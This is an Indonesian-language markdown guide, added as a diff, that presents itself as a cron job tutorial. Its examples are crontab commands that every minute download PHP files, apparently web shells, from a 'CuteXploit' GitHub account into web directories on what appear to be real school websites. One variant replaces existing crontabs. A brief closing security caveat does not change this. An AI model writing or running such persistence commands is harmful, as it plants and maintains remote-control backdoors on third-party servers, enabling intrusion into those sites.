@@ -1,0 +1,83 @@
+## Ringkasan Cron Job
+
+Cron Job digunakan untuk menjalankan perintah secara otomatis berdasarkan jadwal tertentu. Pada contoh berikut, `* * * * *` berarti perintah dijalankan **setiap 1 menit**.
+
+### 1. Menambahkan Cron Tanpa Menghapus Cron Lama
+
+Contoh:
+
+```bash
+(crontab -l 2>/dev/null; echo "* * * * * wget -q https://raw.githubusercontent.com/CuteXploit/BLACKVEIL/refs/heads/main/black.php -O /home2/man2kotabatamsch/public_html/black.php") | crontab -
+```
+
+Fungsinya adalah mengambil crontab yang sudah ada, kemudian menambahkan cron baru tanpa menghapus konfigurasi sebelumnya.
+
+Contoh lainnya:
+
+```bash
+(crontab -l 2>/dev/null; echo "* * * * * wget -q https://raw.githubusercontent.com/CuteXploit/PHP-Web-Console-Manager/refs/heads/main/xXx.php -O /home/mankabre/simdata.man2kabrembang.sch.id/admin/aplikasi/xXx.php") | crontab -
+```
+
+### 2. Menambahkan Cron dengan `echo | crontab -`
+
+Contoh:
+
+```bash
+echo "* * * * * wget -q https://raw.githubusercontent.com/CuteXploit/Kurozakura/refs/heads/main/cx01.php -O /home/mankabre/simdata.man2kabrembang.sch.id/admin/aplikasi/cx01.php" | crontab -
+```
+
+Perintah ini memasang isi yang diberikan sebagai crontab. **Berbeda dengan metode sebelumnya, cara ini dapat menggantikan cron yang sudah ada.**
+
+### 3. URL File yang Digunakan
+
+Contoh URL:
+
+```text
+https://raw.githubusercontent.com/CuteXploit/PHP-Web-Console-Manager/refs/heads/main/xXx.php
+```
+
+`wget` digunakan untuk mengambil file dari URL tersebut dan menyimpannya pada lokasi yang ditentukan oleh opsi `-O`.
+
+### 4. Melihat Cron yang Aktif
+
+```bash
+crontab -l
+```
+
+Digunakan untuk menampilkan seluruh cron job milik user saat ini.
+
+### 5. Menghapus Cron Tertentu
+
+Contoh:
+
+```bash
+crontab -l | grep -v "kata_kunci_cron" | crontab -
+```
+
+Perintah tersebut mempertahankan baris cron lainnya dan membuang baris yang mengandung kata kunci yang ditentukan.
+
+### Keterangan Format Cron
+
+```text
+* * * * * perintah
+│ │ │ │ │
+│ │ │ │ └── Hari dalam minggu
+│ │ │ └──── Bulan
+│ │ └────── Hari dalam bulan
+│ └──────── Jam
+└────────── Menit
+```
+
+Untuk:
+
+```text
+* * * * *
+```
+
+artinya perintah dijalankan **setiap menit**.
+
+### Catatan Keamanan
+
+Contoh di atas mengambil file PHP dari repository eksternal dan menyimpannya langsung ke direktori web server. Jika file tersebut merupakan web console/shell yang memiliki kemampuan menjalankan perintah server, upload, edit, atau menghapus file, penggunaannya memiliki risiko keamanan tinggi.
+
+Untuk deployment aplikasi yang sah, sebaiknya gunakan repository/deployment yang terkontrol, verifikasi file sebelum dijalankan, dan jangan mengekspos web console dengan hak akses server secara langsung.
